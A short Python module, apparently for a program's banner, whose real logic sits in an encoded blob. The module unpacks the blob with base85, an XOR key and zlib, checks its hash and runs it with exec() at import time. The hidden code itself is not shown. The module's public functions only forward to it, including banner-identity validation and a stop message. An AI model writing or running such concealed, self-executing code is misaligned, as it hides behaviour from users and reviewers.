import base64
import hashlib
import zlib


_PAYLOAD_KEY = b"ZhongBannerKey"
_ENC_PAYLOAD = (
    "BC_H;DlNKLcH5a8bw!iI#7a3~x@!`x_1$9$he#Q|0t-PVOaKGeOgjGG%P(nrmAcxE^hsv_TPx&jTKBpXH)3{!`ta$DyU|z3^$IsD>7gf+rx3A$@Fr2>3~O-AU|1_%%@E*4Ux(@a6|~ek3tYciSj=Y*sw}!kN^|+}?m7o&n7!J7*9D@Z?h}O5(MLOO5OOyEYDy>*(hU+v7%6Rs@f_O6<&u<|gsToY(V0WFj-IQ7Sdm&e1N2DAShatco1l7<=dnQ5RZ^wgVHhJ=C|?+s30mrn>@66=JH?yAGI><p&<_XCVxp|o%7EI2YSA~M$MM{up0JqT6y@h5eW(d7xC-CV$=5&av~*>bfkXUziPQ{OwqO$lBif8U2DqOc#~U0?SAvx@#qiNzxw6*NVAOmh9~lh2mz$!eoM9-1?%_eY4|7@qEt!q6=;cO@5xf1w8pa}%g`A7Kgr$AW8&Ri6$}y~_d4%O0^M(%<FinBuf55xf@I}aKeQf#KnJk%R<rz!6=&&p1!Qm&Q0y$kF609xB)q7N*`S9%wDkM}aEL2${;r%PsH{GkyT1-!`Mnb18f>XcCwrKGty(I$NCz_$)KNCP#n<ONNC%F-I+)Lr5_cXKMxr7u+$A1NgB){_ZpksJl#|}2OPGlqflc*7@lfHiw%wb!$D9Y#uXPm|^yjlZ>vg~U|1n(~@UG9L@-&4b?ARBdk+FmY3d|4#<8ScQx`4;vTEI988Si~kSQbPiBi$S4E8vdmoT|pu!>uYl+_oC2Z%F+oA;7DQ7;BSXwSI~rMAvELfcoY9B*Jf*6PQTN6!)%Yx9~|Db(-%8`6mX>_hvJDz)>3(CRjt%o(@sTPx5*>T*6-(_C|lA0;N0;wJ(oC_1ZR5z%PdMGc|?*sZ2k9Lj^_he>;8WHHkQ;}c16$N%&kKO1Ll)W<f3=;pFTP~e-8~H-qBvj`h6D@E88M4`o?;xXUJC@oC{sLhAd5jI%z~lAT{4c^@PIk7TM}f$v^UE6v|M1SG((fTq~?Gy#K=lTliQ;sLA-h)c!wI%f4Ad%n?UG+0x#52%<3Ga8gSVHrV+C#(dLHZL-D?&ez2iUDzf&Kb78!AF)^d{&pZ2p#}VB{8Rv!+%vL%I4)xz7iAA4BK4wfUmv?HPnmNG(g4MPW}z7lgLd3xG0mlE4!+w)"
)
_EXPECTED_PAYLOAD_HASH = (
    "335b5e3634bbe5de9ded78d10405873b6f2c964fc6cddb8add80b19c35fdcfdc"
)


def _decode_payload_source():
    cipher = base64.b85decode(_ENC_PAYLOAD.encode("ascii"))
    compressed = bytes(
        byte ^ _PAYLOAD_KEY[index % len(_PAYLOAD_KEY)]
        for index, byte in enumerate(cipher)
    )
    payload = zlib.decompress(compressed)
    if hashlib.sha256(payload).hexdigest() != _EXPECTED_PAYLOAD_HASH:
        raise RuntimeError("banner payload integrity check failed")
    return payload.decode("utf-8")


_PAYLOAD_NAMESPACE = {}
exec(_decode_payload_source(), _PAYLOAD_NAMESPACE)

STOP_MESSAGE = _PAYLOAD_NAMESPACE["STOP_MESSAGE"]


def get_banner_title():
    return _PAYLOAD_NAMESPACE["get_banner_title"]()


def get_banner_lines():
    return _PAYLOAD_NAMESPACE["get_banner_lines"]()


def build_banner_identity(title, lines):
    return _PAYLOAD_NAMESPACE["build_banner_identity"](title, lines)


def compute_banner_identity_hash(title, lines):
    return _PAYLOAD_NAMESPACE["compute_banner_identity_hash"](title, lines)


def banner_identity_is_valid(title=None, lines=None):
    return _PAYLOAD_NAMESPACE["banner_identity_is_valid"](title, lines)


def generate_banner():
    return _PAYLOAD_NAMESPACE["generate_banner"]()


EXPECTED_BANNER_IDENTITY_HASH = _PAYLOAD_NAMESPACE["EXPECTED_BANNER_IDENTITY_HASH"]
